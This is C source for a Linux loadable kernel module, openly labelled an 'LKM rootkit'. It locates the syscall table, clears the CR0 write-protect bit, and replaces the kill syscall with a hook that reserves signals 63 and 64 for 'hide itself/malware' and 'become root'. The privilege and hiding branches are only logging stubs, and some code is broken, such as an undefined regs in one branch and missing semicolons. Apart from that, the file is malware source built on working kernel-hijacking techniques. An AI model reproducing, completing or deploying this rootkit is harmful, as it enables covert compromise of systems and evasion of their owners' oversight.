#include <linux/init.h>      // macro used to mark up functions e.g., __init __exit
#include <linux/module.h>    // core header for leading LKMs into the kernel
#include <linux/kernel.h>    // contains types, macros, functions for the kernel e.g., kern_info
#include <linux/kallsyms.h>  // contains functions e.g., kallsyms_lookup_name
#include <linux/unistd.h>    // contains syscall numbers
#include <linux/version.h>   // linux/kernel versions e.g., linux_version_code kernel_version
#include <asm/paravirt.h>    // contains function for read_cr0() e.g., read control register 0
#include <linux/dirent.h>    // contain dirent structs etc

/* module information */
MODULE_LICENSE("GPL")
MODULE_AUTHOR("lUc1f3r11")
MODULE_DESCRIPTION("LKM rootkit")
MODULE_VERSION("0.0.1")

unsigned long *__sys_call_table;

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif

enum signals {
    SIGSUPER = 64,   // become root
    SIGINVIS = 63,   // hide become invisible
};

#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
        return 0;
    }
    printk(KERN_INFO "***** hacked kill syscall *****");
    return orig_kill(regs);
}

#else

static asmlinkage long hack_kill(pid_t pid, int sig)
{
    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
        return 0;
    }
    printk(KERN_INFO "***** hacked kill syscall *****");
    return orig_kill(regs);
}

#endif

static int cleanup(void)
{
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    return 0;
}

static int store(void)
{
/* if linux_version_code >= kernel_version(4, 17, 0) syscall use pt_regs stub */
#if PTREGS_SYSCALL_STUB
    /* kill */
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
/* if linux_version_code < kernel_version(4, 17, 0) */
#else
    /* kill */
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#endif

    return 0;
}

static int hook(void)
{
    printk(KERN_INFO "hooked function\n");
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
    return 0;
}

/* custom write_cr0 function to get passed trap */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    /* __asm__ __volatile__() */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    /* to prevent reads from being reordered with respect to writes, use a dummy memory operand. "+m"(__force_order) */
}

/* disable write protection */
static void unprotect_memory(void)
{
    /* bitwise and (&) copies bit to result if it is in both operands unary reverse (-) the bits so -0x10000 becomes 0x01111 */
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "unprotected memory\n");
}

/* enable write protection */
static void protect_memory(void)
{
    /* bitwise or (|) copies bit to result if it is in either operands */
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;
/* if linux_version_code > kernel_version(4, 4, 0) */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    syscall_table = NULL;    // (void*)0
#endif
    return syscall_table;
}

static int __init mod_init(void)
{
    int err = 1;
    printk(KERN_INFO "rootkit: init\n");

    __sys_call_table = get_syscall_table();

    if (!__sys_call_table) {
        printk(KERN_INFO "error: __sys_call_table == null\n");
        return err;
    }

    if (store() == err) {
        printk(KERN_INFO "error: store error\n");
    }

    unprotect_memory();

    if (hook() == err) {
        printk(KERN_INFO "error: hook error\n");
    }

    protect_memory();
    return 0;
}

static void __exit mod_exit(void)
{
    int err = 1;
    printk(KERN_INFO "rootkit: exit\n");

    unprotect_memory();

    if (cleanup() == err) {
        printk(KERN_INFO "error: cleanup error\n");
    }

    protect_memory();
}

module_init(mod_init);
module_exit(mod_exit);